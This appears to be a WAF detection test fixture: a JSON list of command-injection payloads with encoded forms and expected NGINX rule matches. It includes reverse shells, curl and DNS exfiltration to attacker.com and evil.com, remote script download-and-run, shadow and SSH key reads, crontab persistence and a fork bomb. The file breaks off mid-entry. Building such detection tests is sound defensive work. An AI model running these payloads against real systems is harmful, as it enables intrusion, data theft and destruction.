{
  "metadata": {
    "category": "cmdinj",
    "total_patterns": 89,
    "port": 8004,
    "description": "k6 test patterns for cmdinj"
  },
  "patterns": [
    {
      "id": "CMD_BASIC_SEMICOLON_001",
      "name": "Semicolon command separator with ls",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "; ls -la",
      "encoded": "%3B%20ls%20-la",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_BASIC_002",
      "name": "AND operator with whoami",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "&& whoami",
      "encoded": "%26%26%20whoami",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BASIC_003",
      "name": "OR operator with id command",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "|| id",
      "encoded": "%7C%7C%20id",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_BASIC_004",
      "name": "Background execution with ps",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "& ps aux",
      "encoded": "%26%20ps%20aux",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BASIC_005",
      "name": "Password file access attempt",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "; cat /etc/passwd",
      "encoded": "%3B%20cat%20/etc/passwd",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_BASIC_006",
      "name": "System information gathering",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "; uname -a",
      "encoded": "%3B%20uname%20-a",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_BASIC_007",
      "name": "Network information gathering",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "&& netstat -an",
      "encoded": "%26%26%20netstat%20-an",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BASIC_008",
      "name": "Kernel version information",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "|| cat /proc/version",
      "encoded": "%7C%7C%20cat%20/proc/version",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_BASIC_009",
      "name": "Network interface configuration",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "; ifconfig",
      "encoded": "%3B%20ifconfig",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_BASIC_010",
      "name": "Disk space information",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "&& df -h",
      "encoded": "%26%26%20df%20-h",
      "port": 8004,
      "expected_detection": true,
      "severity": "medium",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BASIC_011",
      "name": "Basic pipe with id command",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "|id",
      "encoded": "%7Cid",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_BASIC_012",
      "name": "Double pipe OR operator",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "||ls",
      "encoded": "%7C%7Cls",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_BASIC_013",
      "name": "Semicolon with pwd command",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": ";pwd",
      "encoded": "%3Bpwd",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_BASIC_014",
      "name": "Multiple semicolons injection",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": ";;ls",
      "encoded": "%3B%3Bls",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_BASIC_015",
      "name": "AND operator with whoami",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "&& whoami",
      "encoded": "%26%26%20whoami",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BASIC_016",
      "name": "OR operator with id",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "|| id",
      "encoded": "%7C%7C%20id",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_BASIC_017",
      "name": "Backtick command substitution",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "`id`",
      "encoded": "%60id%60",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_BASIC_018",
      "name": "Dollar-paren command substitution",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "$(uname -a)",
      "encoded": "%24(uname%20-a)",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_BASIC_019",
      "name": "URL encoded newline injection",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "%0als",
      "encoded": "%250als",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BASIC_020",
      "name": "CRLF injection with cat",
      "category": "cmdinj",
      "subcategory": "basic_command_injection",
      "payload": "%0d%0acat /etc/passwd",
      "encoded": "%250d%250acat%20%2Fetc%2Fpasswd",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BACK_001",
      "name": "File deletion via backticks",
      "category": "cmdinj",
      "subcategory": "backtick_execution",
      "payload": "`rm -rf /tmp/*`",
      "encoded": "%60rm%20-rf%20%2Ftmp%2F*%60",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_BASH_001",
      "name": "Direct bash command execution",
      "category": "cmdinj",
      "subcategory": "bash_injection",
      "payload": "; /bin/bash -c 'whoami'",
      "encoded": "%3B%20%2Fbin%2Fbash%20-c%20'whoami'",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_WIN_001",
      "name": "Windows directory listing",
      "category": "cmdinj",
      "subcategory": "windows_cmd",
      "payload": "& dir",
      "encoded": "%26%20dir",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_PIPE_001",
      "name": "Password file piped to grep",
      "category": "cmdinj",
      "subcategory": "pipe_chaining",
      "payload": "cat /etc/passwd | grep root",
      "encoded": "cat%20%2Fetc%2Fpasswd%20%7C%20grep%20root",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_ENC_001",
      "name": "URL encoded whoami command",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "%3Bwhoami",
      "encoded": "%253Bwhoami",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BLIND_001",
      "name": "Time-based blind command injection",
      "category": "cmdinj",
      "subcategory": "blind_command_injection",
      "payload": "; sleep 10",
      "encoded": "%3B%20sleep%2010",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_BLIND_002",
      "name": "Network-based time delay detection",
      "category": "cmdinj",
      "subcategory": "blind_command_injection",
      "payload": "&& ping -c 10 127.0.0.1",
      "encoded": "%26%26%20ping%20-c%2010%20127.0.0.1",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BLIND_003",
      "name": "Out-of-band data exfiltration via curl",
      "category": "cmdinj",
      "subcategory": "blind_command_injection",
      "payload": "| curl http://attacker.com/callback?data=`whoami`",
      "encoded": "%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_BLIND_004",
      "name": "DNS-based data exfiltration",
      "category": "cmdinj",
      "subcategory": "blind_command_injection",
      "payload": "; nslookup `whoami`.attacker.com",
      "encoded": "%3B%20nslookup%20%60whoami%60.attacker.com",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_BLIND_005",
      "name": "Timeout-based command execution",
      "category": "cmdinj",
      "subcategory": "blind_command_injection",
      "payload": "&& timeout 15 bash",
      "encoded": "%26%26%20timeout%2015%20bash",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_SUB_001",
      "name": "Command substitution with whoami",
      "category": "cmdinj",
      "subcategory": "command_substitution",
      "payload": "$(whoami)",
      "encoded": "%24%28whoami%29",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_SUB_002",
      "name": "Backtick command substitution with id",
      "category": "cmdinj",
      "subcategory": "command_substitution",
      "payload": "`id`",
      "encoded": "%60id%60",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_SUB_003",
      "name": "Password file via command substitution",
      "category": "cmdinj",
      "subcategory": "command_substitution",
      "payload": "$(cat /etc/passwd)",
      "encoded": "%24%28cat%20%2Fetc%2Fpasswd%29",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_SUB_004",
      "name": "System info via backtick substitution",
      "category": "cmdinj",
      "subcategory": "command_substitution",
      "payload": "`uname -a`",
      "encoded": "%60uname%20-a%60",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_SUB_005",
      "name": "Root directory listing via substitution",
      "category": "cmdinj",
      "subcategory": "command_substitution",
      "payload": "$(ls -la /root)",
      "encoded": "%24%28ls%20-la%20%2Froot%29",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_ENC_002",
      "name": "URL encoded AND operator with ls",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "%26%26%20ls%20-la",
      "encoded": "%2526%2526%2520ls%2520-la",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
    },
    {
      "id": "CMD_ENC_003",
      "name": "Base64 encoded whoami command",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "d2hvYW1p",
      "encoded": "d2hvYW1p",
      "port": 8004,
      "expected_detection": false,
      "severity": "critical",
      "expected_rule": ""
    },
    {
      "id": "CMD_ENC_004",
      "name": "URL encoded command substitution",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "%24%28whoami%29",
      "encoded": "%2524%2528whoami%2529",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_ENC_005",
      "name": "Hex encoded whoami command",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "\\x77\\x68\\x6f\\x61\\x6d\\x69",
      "encoded": "%5Cx77%5Cx68%5Cx6f%5Cx61%5Cx6d%5Cx69",
      "port": 8004,
      "expected_detection": false,
      "severity": "critical",
      "expected_rule": ""
    },
    {
      "id": "CMD_ENC_006",
      "name": "URL encoded backtick execution",
      "category": "cmdinj",
      "subcategory": "encoded_commands",
      "payload": "%60id%60",
      "encoded": "%2560id%2560",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_REVSH_001",
      "name": "Bash reverse shell",
      "category": "cmdinj",
      "subcategory": "reverse_shell",
      "payload": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
      "encoded": "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_REVSH_002",
      "name": "Netcat reverse shell",
      "category": "cmdinj",
      "subcategory": "reverse_shell",
      "payload": "nc -e /bin/sh 10.0.0.1 4444",
      "encoded": "nc%20-e%20%2Fbin%2Fsh%2010.0.0.1%204444",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_REVSH_003",
      "name": "Python reverse shell",
      "category": "cmdinj",
      "subcategory": "reverse_shell",
      "payload": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
      "encoded": "python%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%2210.0.0.1%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)'",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_ENV_001",
      "name": "Environment variable in PATH",
      "category": "cmdinj",
      "subcategory": "env_injection",
      "payload": "PATH=/tmp:$PATH whoami",
      "encoded": "PATH%3D%2Ftmp%3A%24PATH%20whoami",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_ENV_002",
      "name": "LD_PRELOAD injection",
      "category": "cmdinj",
      "subcategory": "env_injection",
      "payload": "LD_PRELOAD=/tmp/evil.so /bin/id",
      "encoded": "LD_PRELOAD%3D%2Ftmp%2Fevil.so%20%2Fbin%2Fid",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_ENV_003",
      "name": "IFS manipulation",
      "category": "cmdinj",
      "subcategory": "env_injection",
      "payload": "IFS=,;cat,/etc/passwd",
      "encoded": "IFS%3D%2C%3Bcat%2C%2Fetc%2Fpasswd",
      "port": 8004,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX Traversal] File inclusion attack detected"
    },
    {
      "id": "CMD_NEST_001",
      "name": "Nested dollar-paren",
      "category": "cmdinj",
      "subcategory": "nested_substitution",
      "payload": "$($(echo whoami))",
      "encoded": "%24(%24(echo%20whoami))",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_NEST_002",
      "name": "Nested backtick in dollar-paren",
      "category": "cmdinj",
      "subcategory": "nested_substitution",
      "payload": "$(`echo id`)",
      "encoded": "%24(%60echo%20id%60)",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
    },
    {
      "id": "CMD_NEST_003",
      "name": "Triple nested substitution",
      "category": "cmdinj",
      "subcategory": "nested_substitution",
      "payload": "$($($(echo cat) /etc/passwd))",
      "encoded": "%24(%24(%24(echo%20cat)%20%2Fetc%2Fpasswd))",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Traversal] File inclusion attack detected"
    },
    {
      "id": "CMD_FILE_001",
      "name": "Shadow file read",
      "category": "cmdinj",
      "subcategory": "file_manipulation",
      "payload": "; cat /etc/shadow",
      "encoded": "%3B%20cat%20%2Fetc%2Fshadow",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Traversal] File inclusion attack detected"
    },
    {
      "id": "CMD_FILE_002",
      "name": "SSH key exfiltration",
      "category": "cmdinj",
      "subcategory": "file_manipulation",
      "payload": "&& cat ~/.ssh/id_rsa",
      "encoded": "%26%26%20cat%20~%2F.ssh%2Fid_rsa",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_FILE_003",
      "name": "Write to crontab",
      "category": "cmdinj",
      "subcategory": "file_manipulation",
      "payload": "; echo \"* * * * * /tmp/evil.sh\" >> /var/spool/cron/crontabs/root",
      "encoded": "%3B%20echo%20%22*%20*%20*%20*%20*%20%2Ftmp%2Fevil.sh%22%20%3E%3E%20%2Fvar%2Fspool%2Fcron%2Fcrontabs%2Froot",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_PROC_001",
      "name": "Fork bomb attempt",
      "category": "cmdinj",
      "subcategory": "process_spawning",
      "payload": ":(){ :|:& };:",
      "encoded": "%3A()%7B%20%3A%7C%3A%26%20%7D%3B%3A",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_PROC_002",
      "name": "Nohup background execution",
      "category": "cmdinj",
      "subcategory": "process_spawning",
      "payload": "nohup /tmp/backdoor.sh &",
      "encoded": "nohup%20%2Ftmp%2Fbackdoor.sh%20%26",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_PROC_003",
      "name": "Disown hidden process",
      "category": "cmdinj",
      "subcategory": "process_spawning",
      "payload": "/tmp/malware & disown",
      "encoded": "%2Ftmp%2Fmalware%20%26%20disown",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_ADV_056",
      "name": "Command Substitution $()",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "$(whoami)",
      "encoded": "%24%28whoami%29",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_ADV_057",
      "name": "Nested Command Substitution",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "$(cat $(find / -name passwd))",
      "encoded": "%24%28cat%20%24%28find%20%2F%20-name%20passwd%29%29",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_ADV_058",
      "name": "Semicolon Sleep Injection",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "; sleep 5",
      "encoded": "%3B%20sleep%205",
      "port": 8001,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_ADV_059",
      "name": "Newline Command Injection",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "\nid",
      "encoded": "%0Aid",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_ADV_060",
      "name": "Backtick Command Execution",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "`id`",
      "encoded": "%60id%60",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_ADV_061",
      "name": "Double Backtick Execution",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "``whoami``",
      "encoded": "%60%60whoami%60%60",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_ADV_062",
      "name": "AND Command Chain",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "&& id",
      "encoded": "%26%26%20id",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_ADV_063",
      "name": "Pipe Cat Passwd",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "| cat /etc/passwd",
      "encoded": "%7C%20cat%20%2Fetc%2Fpasswd",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_ADV_064",
      "name": "OR Command Chain",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "|| id",
      "encoded": "%7C%7C%20id",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_ADV_065",
      "name": "Curl Exfiltration",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "curl http://evil.com/$(whoami)",
      "encoded": "curl%20http%3A%2F%2Fevil.com%2F%24%28whoami%29",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_ADV_066",
      "name": "IFS Bypass Cat Passwd",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "${IFS}cat${IFS}/etc/passwd",
      "encoded": "%24%7BIFS%7Dcat%24%7BIFS%7D%2Fetc%2Fpasswd",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command substitution attack"
    },
    {
      "id": "CMD_ADV_067",
      "name": "Wget Remote Script",
      "category": "cmdinj",
      "subcategory": "advanced",
      "payload": "wget http://evil.com/shell.sh -O /tmp/s && sh /tmp/s",
      "encoded": "wget%20http%3A%2F%2Fevil.com%2Fshell.sh%20-O%20%2Ftmp%2Fs%20%26%26%20sh%20%2Ftmp%2Fs",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BACK_002",
      "name": "Malicious download via backticks",
      "category": "cmdi",
      "subcategory": "backtick",
      "payload": "`wget http://evil.com/backdoor`",
      "encoded": "%60wget%20http%3A%2F%2Fevil.com%2Fbackdoor%60",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
    },
    {
      "id": "CMD_BACK_003",
      "name": "Reverse shell via backticks",
      "category": "cmdi",
      "subcategory": "backtick",
      "payload": "`nc -l -p 1234 -e /bin/bash`",
      "encoded": "%60nc%20-l%20-p%201234%20-e%20%2Fbin%2Fbash%60",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
    },
    {
      "id": "CMD_BACK_004",
      "name": "Remote script execution via backticks",
      "category": "cmdi",
      "subcategory": "backtick",
      "payload": "`curl -s http://attacker.com | sh`",
      "encoded": "%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
    },
    {
      "id": "CMD_BACK_005",
      "name": "System file modification via backticks",
      "category": "cmdi",
      "subcategory": "backtick",
      "payload": "`echo 'hacked' > /etc/motd`",
      "encoded": "%60echo%20%27hacked%27%20%3E%20%2Fetc%2Fmotd%60",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
    },
    {
      "id": "CMD_BASH_002",
      "name": "Bash reverse shell",
      "category": "cmdi",
      "subcategory": "bash_specific",
      "payload": "&& bash -i >& /dev/tcp/attacker.com/4444 0>&1",
      "encoded": "%26%26%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_BASH_003",
      "name": "Shell shadow file access",
      "category": "cmdi",
      "subcategory": "bash_specific",
      "payload": "| /bin/sh -c 'cat /etc/shadow'",
      "encoded": "%7C%20%2Fbin%2Fsh%20-c%20%27cat%20%2Fetc%2Fshadow%27",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX Traversal] File inclusion attack detected"
    },
    {
      "id": "CMD_BASH_004",
      "name": "Bash TCP shell via exec",
      "category": "cmdi",
      "subcategory": "bash_specific",
      "payload": "; exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done",
      "encoded": "%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_BASH_005",
      "name": "Path environment variable access",
      "category": "cmdi",
      "subcategory": "bash_specific",
      "payload": "&& bash -c 'echo $PATH'",
      "encoded": "%26%26%20bash%20-c%20%27echo%20%24PATH%27",
      "port": 8001,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
    },
    {
      "id": "CMD_PIPE_002",
      "name": "Process list piped to grep",
      "category": "cmdi",
      "subcategory": "pipe",
      "payload": "ps aux | grep apache",
      "encoded": "ps%20aux%20%7C%20grep%20apache",
      "port": 8001,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_PIPE_003",
      "name": "Network stats piped to grep",
      "category": "cmdi",
      "subcategory": "pipe",
      "payload": "netstat -an | grep LISTEN",
      "encoded": "netstat%20-an%20%7C%20grep%20LISTEN",
      "port": 8001,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_PIPE_004",
      "name": "Directory listing piped to head",
      "category": "cmdi",
      "subcategory": "pipe",
      "payload": "ls -la | head -10",
      "encoded": "ls%20-la%20%7C%20head%20-10",
      "port": 8001,
      "expected_detection": true,
      "severity": "high",
      "expected_rule": "[NGINX CMDi] Command injection via pipe"
    },
    {
      "id": "CMD_PIPE_005",
      "name": "Config file search and read via pipe",
      "category": "cmdi",
      "subcategory": "pipe",
      "payload": "find / -name '*.conf' | xargs cat",
      "encoded": "find%20%2F%20-name%20%27%2A.conf%27%20%7C%20xargs%20cat",
      "port": 8001,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
    },
    {
      "id": "CMD_OBF_001",
      "name": "Quote Splitting Whoami",
      "category": "cmdinj",
      "subcategory": "obfuscation",
      "payload": ";wh''oami",
      "encoded": "%3Bwh%27%27oami",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_OBF_002",
      "name": "Double Quote Splitting",
      "category": "cmdinj",
      "subcategory": "obfuscation",
      "payload": ";wh\"\"oami",
      "encoded": "%3Bwh%22%22oami",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_OBF_003",
      "name": "Backslash Bypass Cat",
      "category": "cmdinj",
      "subcategory": "obfuscation",
      "payload": ";c\\at /etc/passwd",
      "encoded": "%3Bc%5Cat%20%2Fetc%2Fpasswd",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_OBF_004",
      "name": "Wildcard Command Bypass",
      "category": "cmdinj",
      "subcategory": "obfuscation",
      "payload": ";/bin/c?t /etc/p?sswd",
      "encoded": "%3B%2Fbin%2Fc%3Ft%20%2Fetc%2Fp%3Fsswd",
      "port": 8004,
      "expected_detection": true,
      "severity": "critical",
      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
    },
    {
      "id": "CMD_OBF_005",
      "name": "Brace Expansion Bypass",
      "category": "cmdinj",
